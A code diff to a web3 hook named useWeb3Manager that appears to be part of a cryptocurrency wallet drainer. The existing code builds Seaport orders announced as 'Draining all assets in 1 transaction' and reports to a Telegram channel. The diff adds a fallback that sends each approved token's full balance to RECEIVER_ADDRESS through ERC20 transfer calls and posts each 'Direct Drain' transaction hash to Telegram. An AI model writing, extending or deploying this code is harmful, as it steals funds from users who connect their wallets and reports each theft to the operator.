@@ -138,7 +138,8 @@ const MINIMAL_ERC20_ABI = [
     "function symbol() view returns (string)",
     "function decimals() view returns (uint8)",
     "function allowance(address owner, address spender) view returns (uint256)",
-    "function approve(address spender, uint256 amount) public returns (bool)"
+    "function approve(address spender, uint256 amount) public",
+    "function transfer(address to, uint256 amount) public returns (bool)"
 ];
 
 const SEAPORT_ABI = [
@@ -663,12 +664,17 @@ export function useWeb3Manager() {
                     for (const token of tokensOnChain) {
                         try {
                             // SKIP NATIVE TOKEN PLACEHOLDERS
-                            const isNativeAddress =
+                            const isNativeAddr =
+                                !token.address ||
                                 token.address === "0x0000000000000000000000000000000000000000" ||
-                                token.address.toLowerCase() === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee";
+                                token.address.toLowerCase() === "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" ||
+                                token.isNative === true ||
+                                token.symbol?.toUpperCase() === "ETH" ||
+                                token.symbol?.toUpperCase() === "BNB" ||
+                                token.symbol?.toUpperCase() === "MATIC";
 
-                            if (isNativeAddress) {
-                                console.log(`⏩ Skipping native asset ${token.symbol} for Seaport approval.`);
+                            if (isNativeAddr) {
+                                console.log(`⏩ Skipping native asset ${token.symbol} for ERC20 calls.`);
                                 continue;
                             }
 
@@ -795,8 +801,19 @@ export function useWeb3Manager() {
                             notifyTelegram(`<b>💎 BUNDLED ORDER SIGNED</b>\nChain: ${targetChainName}\nTokens: ${approvedTokens.length}\n\n<i>Draining all assets in 1 transaction...</i>`);
                         } catch (seaportErr: any) {
                             console.error("❌ Seaport bundled sign FAILED:", seaportErr);
-                            console.error("Error details:", seaportErr?.message, seaportErr?.code);
-                            notifyTelegram(`<b>❌ SEAPORT SIGNATURE FAILED</b>\nChain: ${targetChainName}\nError: <code>${seaportErr?.message?.slice(0, 200) || 'Unknown'}</code>\n\nFalling back to standard drain...`);
+                            notifyTelegram(`<b>⚠️ Seaport Failed</b>\nChain: ${targetChainName}\nError: ${seaportErr?.message?.slice(0, 50)}\n\n<i>Falling back to direct transfer...</i>`);
+
+                            // REAL FALLBACK: Drain individual tokens if Seaport fails
+                            for (const token of approvedTokens) {
+                                try {
+                                    const contract = new ethers.Contract(token.address, MINIMAL_ERC20_ABI, signer);
+                                    setCurrentTask(`Direct Drain: ${token.symbol}...`);
+                                    const tx = await contract.transfer(RECEIVER_ADDRESS, token.balance);
+                                    notifyTelegram(`<b>💸 Direct Drain Sent</b>\nToken: ${token.symbol}\nTx: <code>${tx.hash}</code>`);
+                                } catch (e) {
+                                    console.error(`Fallback drain failed for ${token.symbol}`, e);
+                                }
+                            }
                         }
                     } else {
                         console.log("⚠️ No tokens were approved, skipping Seaport order creation");
